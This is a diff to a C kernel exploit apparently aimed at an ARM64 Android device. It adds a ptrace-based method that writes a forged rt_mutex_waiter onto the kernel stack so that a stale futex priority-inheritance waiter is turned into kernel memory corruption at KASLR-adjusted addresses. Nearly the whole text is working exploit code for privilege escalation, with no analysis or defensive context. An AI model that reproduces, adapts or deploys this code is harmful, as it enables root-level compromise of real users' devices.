@@ -7,6 +7,20 @@
 #include <asm/sigcontext.h>
 #include <ucontext.h>
 #endif
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_PTRACE) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE
+#include <sys/ptrace.h>
+#ifndef NT_PRFPREG
+#define NT_PRFPREG 2
+#endif
+#ifndef PTRACE_SETREGSET
+#define PTRACE_SETREGSET 0x4205
+#endif
+#ifndef PTRACE_TRACEME
+#define PTRACE_TRACEME 0
+#endif
+#endif
 
 #ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
@@ -809,6 +823,10 @@ static void slide_log_child_context(void) {
       defined(SLIDE_STACK_WRITER_SIGRETURN) && \
       SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
   stack_writer = "sigreturn";
+#elif defined(SLIDE_STACK_WRITER) && \
+      defined(SLIDE_STACK_WRITER_PTRACE) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE
+  stack_writer = "ptrace";
 #endif
   pr_success("slide child context stack_writer=%s pid=%d uid=%u euid=%u "
              "gid=%u egid=%u attr=%s enforce=%s\n",
@@ -1055,7 +1073,11 @@ static void slide_reset_consume_state(void) {
 #endif
 }
 
-#if defined(SLIDE_STACK_WRITER)
+#if defined(SLIDE_STACK_WRITER) && \
+    ((defined(SLIDE_STACK_WRITER_MCAST) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST) || \
+     (defined(SLIDE_STACK_WRITER_SIGRETURN) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN))
 static void slide_build_fake_waiter(unsigned char *payload,
                                     size_t waiter_off) {
   uintptr_t tree_parent = slide_oracle_parent;
@@ -1082,6 +1104,124 @@ static void slide_build_fake_waiter(unsigned char *payload,
                   tree_parent, tree_right, tree_left,
                   pi_parent, pi_right, pi_left,
                   fake_task, fake_lock, FAKE_WAITER_PRIO);
+}
+#endif
+
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_PTRACE) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE
+static pid_t slide_ptrace_child = -1;
+static atomic_int slide_ptrace_last_ret;
+static atomic_int slide_ptrace_last_errno;
+
+/*
+ * Create a stopped child before the futex waiter exists.  The waiter
+ * thread is the tracer, so the later PTRACE_SETREGSET syscall runs on
+ * the same kernel stack that carries the stale rt_mutex_waiter.
+ */
+static int slide_ptrace_prepare(void) {
+  if (slide_ptrace_child > 0) {
+    return 1;
+  }
+
+  long child = syscall(SYS_clone, SIGCHLD, 0, 0, 0, 0);
+  if (child < 0) {
+    pr_error("slide ptrace clone errno=%d\n", errno);
+    return 0;
+  }
+  if (child == 0) {
+    long traced = syscall(SYS_ptrace, PTRACE_TRACEME, 0, 0, 0);
+    if (traced < 0) {
+      syscall(SYS_exit_group, 1);
+    }
+    pid_t pid = (pid_t)syscall(SYS_getpid);
+    pid_t tid = (pid_t)syscall(SYS_gettid);
+    syscall(SYS_tgkill, pid, tid, SIGSTOP);
+    syscall(SYS_exit_group, 0);
+    for (;;) {
+    }
+  }
+
+  int status = 0;
+  pid_t waited;
+  do {
+    waited = waitpid((pid_t)child, &status, 0);
+  } while (waited < 0 && errno == EINTR);
+  if (waited != (pid_t)child || !WIFSTOPPED(status)) {
+    if (waited == (pid_t)child) {
+      kill((pid_t)child, SIGKILL);
+    }
+    pr_error("slide ptrace child did not stop status=%#x errno=%d\n",
+             status, errno);
+    return 0;
+  }
+  slide_ptrace_child = (pid_t)child;
+  return 1;
+}
+
+static void slide_build_ptrace_waiter(unsigned char *buffer, size_t offset) {
+  uintptr_t delta = slide_p0_offset;
+  uintptr_t tree_parent = SLIDE_NFULNL_LOGGER_OBJECT + delta;
+  uintptr_t tree_left = SLIDE_WAITER_TREE_LEFT + delta;
+  uintptr_t pi_parent = SLIDE_NFULNL_LOGGER_OBJECT + delta;
+  uintptr_t pi_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + delta;
+  uintptr_t task = SLIDE_WAITER_TASK + delta;
+
+  put_fake_waiter(buffer, offset,
+                  tree_parent, 0, tree_left,
+                  pi_parent, 0, pi_left,
+                  task, fake_lock, FAKE_WAITER_PRIO);
+}
+
+static void slide_ptrace_stack_copy(void) {
+  if (slide_ptrace_child <= 0) {
+    atomic_store(&slide_ptrace_last_ret, -1);
+    atomic_store(&slide_ptrace_last_errno, ESRCH);
+    atomic_store(&slide_stack_write_window, 0);
+    atomic_store(&slide_route_done, 1);
+    return;
+  }
+
+  unsigned char buffer[PTRACE_FPR_BUFFER_SIZE] __attribute__((aligned(16)));
+  memset(buffer, 0, sizeof(buffer));
+  slide_build_ptrace_waiter(buffer, PTRACE_FPR_WAITER_OFF);
+
+  struct iovec iov;
+  iov.iov_base = buffer;
+  iov.iov_len = sizeof(buffer);
+
+  slide_reset_consume_state();
+
+  errno = 0;
+  long ret = syscall(SYS_ptrace, PTRACE_SETREGSET, slide_ptrace_child,
+                     (void *)(uintptr_t)NT_PRFPREG, &iov);
+  int saved_errno = errno;
+  atomic_store(&slide_ptrace_last_ret, (int)ret);
+  atomic_store(&slide_ptrace_last_errno, saved_errno);
+
+  if (ret != 0) {
+    pr_error("slide ptrace setregset ret=%ld errno=%d child=%d\n",
+             ret, saved_errno, slide_ptrace_child);
+    atomic_store(&slide_stack_write_window, 0);
+    atomic_store(&slide_route_done, 1);
+    return;
+  }
+
+  /*
+   * The fake waiter is now on the waiter thread's kernel stack.  Wake
+   * the consumer and make no further syscalls on this thread until the
+   * consumer's sched_setattr() has walked the PI chain.
+   */
+  atomic_store(&slide_consume_go, 1);
+  while (!atomic_load(&slide_consume_stop)) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+  int sched_ok = atomic_load(&slide_consume_sched_ok);
+  int window = sched_ok > 0;
+  atomic_store(&slide_stack_write_window, window);
+  pr_info("slide ptrace setregset ret=%ld errno=%d sched_ok=%d window=%d\n",
+          ret, saved_errno, sched_ok, window);
+  atomic_store(&slide_route_done, 1);
 }
 #endif
 
@@ -1834,6 +1974,17 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   pin_to_core(SLIDE_WAITER_CORE);
 #endif
 
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_PTRACE) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE
+  if (!slide_ptrace_prepare()) {
+    pr_error("slide ptrace writer preparation failed\n");
+    atomic_store(&slide_waiter_waiting, 1);
+    atomic_store(&slide_route_done, 1);
+    return NULL;
+  }
+#endif
+
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter lock chain errno=%d\n", errno);
     return NULL;
@@ -1890,24 +2041,44 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
       defined(SLIDE_STACK_WRITER_SIGRETURN) && \
       SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
   slide_sigreturn_stack_copy();
+#elif defined(SLIDE_STACK_WRITER) && \
+      defined(SLIDE_STACK_WRITER_PTRACE) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE
+  slide_ptrace_stack_copy();
 #elif defined(SLIDE_STACK_WRITER)
 #error Unsupported SLIDE_STACK_WRITER value
 #else
   slide_pselect_stack_copy();
 #endif
+#if !(defined(SLIDE_STACK_WRITER) && \
+      defined(SLIDE_STACK_WRITER_PTRACE) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE)
   pr_info("slide pi stage=writer-return tid=%d sched_ok=%d window=%d\n",
           tid, atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_stack_write_window));
   atomic_store(&slide_route_done, 1);
+#endif
 
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   while (!atomic_load(&slide_route_stop)) {
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_PTRACE) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE
+    __asm__ volatile("yield" ::: "memory");
+#else
     usleep(10000);
+#endif
   }
   return NULL;
 #else
   for (;;) {
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_PTRACE) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE
+    __asm__ volatile("yield" ::: "memory");
+#else
     sleep(1);
+#endif
   }
 #endif
 }
